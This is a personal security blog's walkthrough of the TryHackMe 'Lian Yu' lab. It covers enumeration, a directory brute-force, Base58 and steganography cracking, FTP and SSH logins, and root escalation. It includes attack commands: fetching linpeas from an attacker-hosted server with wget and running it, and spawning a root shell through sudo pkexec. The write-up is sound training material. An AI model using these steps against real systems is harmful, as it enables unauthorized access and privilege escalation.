<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="Lian Yu is another beginner level challenge on TryHackMe. Below is a walkthrough to Find all the flags.
First, let&rsquo;s run nmap with nmap -sC -sV -T4 [machine ip]
It appears that there is ftp, ssh, tcp, and rpc open. Let&rsquo;s start by taking a look at the website in a web browser. It appears that this website is based on the DC comic book hero, Arrow.
Let&rsquo;s use gobuster to enumerate the website with gobuster dir -u [machine ip] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content=" Lian Yu - TryHackMe"><meta name=twitter:description content="Lian Yu is another beginner level challenge on TryHackMe. Below is a walkthrough to Find all the flags.
First, let&rsquo;s run nmap with nmap -sC -sV -T4 [machine ip]
It appears that there is ftp, ssh, tcp, and rpc open. Let&rsquo;s start by taking a look at the website in a web browser. It appears that this website is based on the DC comic book hero, Arrow.
Let&rsquo;s use gobuster to enumerate the website with gobuster dir -u [machine ip] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2."><meta property="og:title" content=" Lian Yu - TryHackMe"><meta property="og:description" content="Lian Yu is another beginner level challenge on TryHackMe. Below is a walkthrough to Find all the flags.
First, let&rsquo;s run nmap with nmap -sC -sV -T4 [machine ip]
It appears that there is ftp, ssh, tcp, and rpc open. Let&rsquo;s start by taking a look at the website in a web browser. It appears that this website is based on the DC comic book hero, Arrow.
Let&rsquo;s use gobuster to enumerate the website with gobuster dir -u [machine ip] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-07-13-lian-yu/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-07-13T00:00:00+00:00"><meta property="article:modified_time" content="2020-07-13T00:00:00+00:00"><title>Lian Yu - TryHackMe · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-07-13-lian-yu/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.4f936f7daad2af2ad663469e77272baab2a7f6de967e8bb4d8964dfe1ee5b920.css integrity="sha256-T5NvfarSryrWY0aedycrqrKn9t6Wfou02JZN/h7luSA=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.111.1"></head><body class="preload-transitions colorscheme-light"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-07-13-lian-yu/>Lian Yu - TryHackMe</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-07-13T00:00:00Z>July 13, 2020</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
4-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/lian-yu/>Lian Yu</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/tryhackme/>TryHackMe</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/privilege-escalation/>privilege escalation</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/steganography/>steganography</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/website-enumeration/>website enumeration</a></span></div></div></header><div><p>Lian Yu is another beginner level challenge on <a href=https://www.tryhackme.com>TryHackMe</a>. Below is a walkthrough to Find all the flags.</p><p>First, let&rsquo;s run nmap with <strong>nmap -sC -sV -T4 [machine ip]</strong></p><p><img src=/assets/img/LianYu1.png alt="Lian Yu nmap"></p><p>It appears that there is ftp, ssh, tcp, and rpc open. Let&rsquo;s start by taking a look at the website in a web browser. It appears that this website is based on the DC comic book hero, Arrow.</p><p><img src=/assets/img/LianYu2.png alt="Lian Yu website"></p><p>Let&rsquo;s use gobuster to enumerate the website with <strong>gobuster dir -u [machine ip] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</strong>. After a bit, an <strong>island</strong> subdirectory shows up.</p><p><img src=/assets/img/LianYu3.png alt="Lian Yu gobuster"></p><p>Let&rsquo;s visit the page. It looks like there&rsquo;s a code word, but it doesn&rsquo;t appear to be there. Highlighting the entire page causes it to show up, however.</p><p><img src=/assets/img/LianYu4.png alt="Lian Yu island page"></p><p>Lian_Yu appears in bold, so let&rsquo;s try both ftp and ssh as Lian_Yu with the code word we uncovered. Unfortunately, neither one was successful.</p><p><img src=/assets/img/LianYu5.png alt="Lian Yu failed ssh and ftp"></p><p>We will make note of this code word for later. Next, the hint for the first question states that the directory is in numbers. It also appears to be 4 digits in length. Let&rsquo;s create a file that contains numbers from 0000 to 9999 with the following <strong>seq -w 9999 > pins.txt</strong>. This will create a text file (pins.txt) with this number range in it. Now let&rsquo;s run <strong>gobuster dir -u http://[machine ip]/island -w pins.txt</strong> and see what shows up. It appears there is another subdirectory of <strong>2100</strong> underneath island. This is the answer to the first question.</p><p><img src=/assets/img/LianYu6.png alt="Lian Yu gobuster 2100"></p><p>There is a video on this page, but it appears to be a part of the first episode of the Arrow television series, which doesn&rsquo;t seem to have any relevance to this challenge. When I look at the source of the page, however, there is a comment as shown below.</p><p><img src=/assets/img/LianYu7.png alt="Lian Yu 2100 page source"></p><p>The hint for this question mentions searching for a file by extension, maybe .ticket is the file extension? I navigated to the dirbuster wordlist with <strong>cd /usr/share/wordlists/dirbuster</strong> and ran <strong>pw-inspector -i directory-list-lowercase-2.3-medium.txt -m 11 - M 11 -o ~/arrow.txt</strong>. I knew the file was 11 characters in length before the potential extension of ticket based on the format of the answer in TryHackMe. I then used this as the wordlist in gobuster under the /island/2100 directory as follows <strong>gobuster dir -u http://[machine ip]/island/2100/ -w arrow.txt -x .ticket</strong>. Within a couple of moments it uncovers <strong>green_arrow.ticket</strong>.</p><p><img src=/assets/img/LianYu8.png alt="Lian Yu green_arrow.ticket"></p><p>Let&rsquo;s navigate to that page. We are provided with a &ldquo;token&rdquo;. The hint states it appears to be base, so use cyberchef as recommended and you will eventually figure out it was encoded in Base58. This decoded is the ftp password, which is the answer to the 3rd question.</p><p><img src=/assets/img/LianYu10.png alt="Lian Yu Base 58 decode"></p><p>Let&rsquo;s try logging in to the site via ftp, as we have the password. Remember the code word that we uncovered earlier? Let&rsquo;s see if that&rsquo;s the user.</p><p><img src=/assets/img/LianYu11.png alt="Lian Yu FTP Access"></p><p>Success! Let&rsquo;s see what&rsquo;s on this ftp site.</p><p><img src=/assets/img/LianYu12.png alt="Lian Yu ftp directory listing"></p><p>Let&rsquo;s save all these pictures and see what they are with <strong>get Leave_me_alone.png, get Queen&rsquo;s_Gambit.png,</strong> and <strong>get aa.jpg</strong>.</p><p><img src=/assets/img/LianYu13.png alt="Lian Yu get files"></p><p>Let&rsquo;s type <strong>quit</strong> and then open up these images to see what&rsquo;s in them. <strong>aa.jpg</strong> and <strong>Queen&rsquo;s_Gambit.png</strong> open fine, but there is an error when attempting to open <strong>Leave_me_alone.png</strong>. .jpg files can be used in steganography, so let&rsquo;s use stegcracker with <strong>stegcracker aa.jpg</strong>. After a few moments, it uncovers the password of <strong>password</strong>, and extracts the contents to <strong>aa.jpg.out</strong>.</p><p><img src=/assets/img/LianYu14.png alt="Lian Yu stegcracker"></p><p>Running <strong>file aa.jpg.out</strong> reveals that this is a zip file, let&rsquo;s rename it to .zip with <strong>mv aa.jpg.out aa.zip</strong></p><p><img src=/assets/img/LianYu15.png alt="Lian Yu change file to zip"></p><p>Inside the zip files are two files, one is a 5 character name, which is the answer to the next question.</p><p><img src=/assets/img/LianYu16.png alt="Lian Yu Open Zip File"></p><p>The five letter file name includes the ssh password. However, we do not have a username and vigilante does not work this time around. Let&rsquo;s reconnect as vigilante via ftp and type <strong>cd ..</strong> followed by <strong>ls</strong> to list all the user directories. There is another user directory present.</p><p><img src=/assets/img/LianYu17.png alt="Lian Yu enumerate user folders via ftp"></p><p>It appears that slade is another user. Let&rsquo;s try logging in via ssh as slade with <strong>ssh slade@[machine ip]</strong> and utilize the password uncovered in the zip file earlier. Success, let&rsquo;s run <strong>ls</strong> and a user.txt file is there. Let&rsquo;s run <strong>cat user.txt</strong> to uncover the user flag.</p><p><img src=/assets/img/LianYu19.png alt="Lian Yu ssh connection"></p><p>Let&rsquo;s use linpeas to enumerate this host for interesting files. First, let&rsquo;s server up an http server on your attacking pc with <strong>python3 -m http.server</strong></p><p><img src=/assets/img/LianYu20.png alt="Lian Yu Python HTTP Server"></p><p>Now, let&rsquo;s navigate to the /tmp folder on our victim with <strong>cd /tmp</strong> since it&rsquo;s typically a world writeable directory. Next, let&rsquo;s use <strong>wget http://[attacker ip]:8000/linpeas.sh</strong> followed by <strong>chmod 777 linpeas.sh</strong> and finally <strong>./linpeas.sh</strong> to start enumerating our host. Unfortunately, this does not turn up much. Let&rsquo;s run <strong>sudo -l</strong> and see what shows up.</p><p><img src=/assets/img/LianYu22.png alt="Liam Yu sudo -l"></p><p>Awesome, we can execute pkexec as sudo. Let&rsquo;s run <strong>sudo /usr/bin/pkexec /bin/sh</strong>. Now we have a root shell.</p><p><img src=/assets/img/LianYu23.png alt="Lian Yu Root Shell"></p><p>Now let&rsquo;s run <strong>cd /root</strong>, followed by <strong>ls</strong>, and then finally, <strong>cat root.txt</strong> to get the final flag.</p><p><img src=/assets/img/LianYu24.png alt="Lian Yu Root Flag"></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2023
Kiel Vaughn</section></footer></main><script src=/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script></body></html>